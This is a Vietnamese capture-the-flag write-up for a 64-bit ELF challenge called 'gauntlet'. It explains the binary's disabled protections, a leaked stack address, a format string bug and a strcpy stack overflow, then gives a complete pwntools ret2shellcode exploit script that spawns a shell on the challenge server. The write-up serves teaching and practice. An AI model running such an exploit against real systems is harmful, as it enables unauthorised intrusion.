# Gauntlet Writeup

## 1. Thông tin bài

Bài cho một file ELF 64-bit tên `gauntlet`, không có mã nguồn.

Mục tiêu là phân tích binary, tìm lỗi và khai thác để lấy shell/flag.

---

## 2. Kiểm tra file

Dùng `file`:

```bash
file gauntlet
```

Kết quả chính:

```text
ELF 64-bit LSB executable, x86-64
not stripped
```

Binary là chương trình Linux 64-bit và không bị strip, nên vẫn còn symbol như `main`.

Kiểm tra bảo vệ bằng `checksec`:

```bash
checksec --file=gauntlet
```

Các điểm quan trọng:

```text
PIE: No PIE
Canary: No canary
NX: Disabled
RELRO: Partial RELRO
```

Ý nghĩa:

- **No PIE**: địa chỉ code cố định.
- **No Canary**: không có stack canary để chặn stack overflow.
- **NX Disabled**: stack có thể thực thi code, nên có thể đặt shellcode lên stack rồi nhảy về đó.
- **Partial RELRO**: không quan trọng trong hướng khai thác này.

---

## 3. Dịch ngược hàm `main`

Sau khi dịch ngược, logic chính của chương trình gần như sau:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv)
{
    char buf[112];
    char *heap_buf;

    heap_buf = malloc(1000);

    printf("%p\n", buf);
    fflush(stdout);

    fgets(heap_buf, 1000, stdin);
    heap_buf[999] = '\0';

    printf(heap_buf);
    fflush(stdout);

    fgets(heap_buf, 1000, stdin);
    heap_buf[999] = '\0';

    strcpy(buf, heap_buf);

    return 0;
}
```

Chương trình có 2 lần nhập dữ liệu vào `heap_buf`.

Lần nhập đầu tiên:

```c
fgets(heap_buf, 1000, stdin);
printf(heap_buf);
```

Lần nhập thứ hai:

```c
fgets(heap_buf, 1000, stdin);
strcpy(buf, heap_buf);
```

---

## 4. Phân tích lỗi

### 4.1. Leak địa chỉ stack

Ngay đầu chương trình có dòng:

```c
printf("%p\n", buf);
```

Chương trình tự in ra địa chỉ của `buf` trên stack.

Ví dụ:

```text
0x7fffffffe120
```

Đây là một lỗi leak địa chỉ. Nhờ địa chỉ này, ta biết chính xác `buf` đang nằm ở đâu trên stack.

Điều này rất quan trọng vì ASLR sẽ random địa chỉ stack mỗi lần chạy.

---

### 4.2. Format string vulnerability

Chương trình dùng:

```c
printf(heap_buf);
```

Đúng ra phải là:

```c
printf("%s", heap_buf);
```

Vì truyền trực tiếp input của người dùng vào `printf`, ta có lỗi format string.

Tuy nhiên trong bài này không cần khai thác lỗi format string, vì chương trình đã leak sẵn địa chỉ `buf`.

---

### 4.3. Stack buffer overflow

Input lần hai được đọc vào `heap_buf`:

```c
fgets(heap_buf, 1000, stdin);
```

Sau đó chương trình copy sang `buf`:

```c
strcpy(buf, heap_buf);
```

Vấn đề là `heap_buf` có thể chứa gần 1000 byte, còn `buf` trên stack chỉ khoảng 112 byte.

Do đó `strcpy` sẽ làm tràn `buf`, ghi đè saved RBP và saved RIP.

Điểm dễ nhầm là mình nhập vào `heap_buf`, nhưng payload sau đó được copy sang `buf` bằng `strcpy`.

Vì vậy shellcode cuối cùng nằm trong `buf`, không phải chỉ nằm ở `heap_buf`.

---

## 5. Tìm offset tới RIP

Trong assembly, `buf` nằm tại:

```asm
lea rax, [rbp-0x70]
```

Tức là:

```text
buf = rbp - 0x70
```

Saved RBP nằm tại:

```text
rbp
```

Saved RIP nằm tại:

```text
rbp + 8
```

Vậy offset từ đầu `buf` tới saved RIP là:

```text
0x70 + 8 = 0x78 = 120 bytes
```

Do đó payload cần có dạng:

```text
[ shellcode ][ padding đến 120 byte ][ địa chỉ trả về mới ]
```

Địa chỉ trả về mới sẽ là địa chỉ `buf` mà chương trình đã leak.

---

## 6. Ý tưởng khai thác

Vì binary có:

```text
NX Disabled
No Canary
Leak địa chỉ buf
Stack overflow
```

Hướng khai thác đơn giản nhất là:

1. Nhận địa chỉ `buf` bị leak từ chương trình.
2. Gửi input đầu tiên bất kỳ để đi qua `printf(heap_buf)`.
3. Gửi input thứ hai chứa shellcode.
4. Padding đủ 120 byte.
5. Ghi đè saved RIP bằng địa chỉ `buf`.
6. Khi `main` return, chương trình nhảy về `buf` và chạy shellcode.

Payload tổng quát:

```text
payload = shellcode + padding + p64(buf_leak)
```

---

## 7. Script khai thác local/remote

```python
#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./gauntlet", checksec=False)
context.arch = "amd64"

HOST = "saturn.picoctf.net"
PORT = 12345

# Local:
# io = process("./gauntlet")

# Remote:
io = remote(HOST, PORT)

# Nhận địa chỉ buf bị leak
leak = int(io.recvline().strip(), 16)
log.success(f"buf leak = {hex(leak)}")

# Input 1: không cần khai thác format string
io.sendline(b"A")

# Shellcode gọi /bin/sh
shellcode = asm(shellcraft.sh())

offset = 120

payload  = shellcode
payload += b"A" * (offset - len(shellcode))
payload += p64(leak)

# Input 2: được đọc vào heap_buf rồi strcpy sang buf
io.sendline(payload)

io.interactive()
```

Lưu ý sửa `HOST` và `PORT` theo server bài cho.

---

## 8. Vì sao dùng địa chỉ leak của `buf`?

Ban đầu input được nhập vào `heap_buf`, nhưng sau đó chương trình gọi:

```c
strcpy(buf, heap_buf);
```

Nghĩa là dữ liệu từ `heap_buf` được copy sang `buf` trên stack.

Shellcode nằm ở đầu payload, nên sau khi `strcpy`, shellcode nằm ở đầu `buf`.

Vì vậy khi ghi đè RIP bằng địa chỉ `buf`, chương trình sẽ return về đầu `buf` và thực thi shellcode.

---

## 9. Kết luận

Lỗi chính của bài là stack buffer overflow tại:

```c
strcpy(buf, heap_buf);
```

Chương trình còn leak sẵn địa chỉ stack:

```c
printf("%p\n", buf);
```

Vì NX bị tắt, ta có thể đặt shellcode trực tiếp lên stack và ghi đè RIP trỏ về địa chỉ `buf`.

Thông số quan trọng:

```text
Offset tới RIP: 120 bytes
Return address: địa chỉ buf được leak
Kỹ thuật: ret2shellcode
```

